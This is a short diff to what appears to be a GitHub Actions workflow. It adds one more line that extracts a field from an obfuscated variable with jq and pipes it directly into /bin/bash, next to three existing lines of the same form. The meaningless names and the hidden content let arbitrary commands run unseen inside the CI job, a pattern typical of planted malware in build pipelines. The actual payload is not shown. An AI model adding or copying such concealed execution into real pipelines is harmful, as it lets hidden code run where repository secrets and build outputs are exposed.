@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$jwxt2366" | jq -r .ea82084 | /bin/bash
           echo $kw80 | jq -r .crfbe77232 | /bin/bash
           echo $oncm0426 | jq -r .nkic91 | /bin/bash
+          echo $ec50 | jq -r .ng62 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
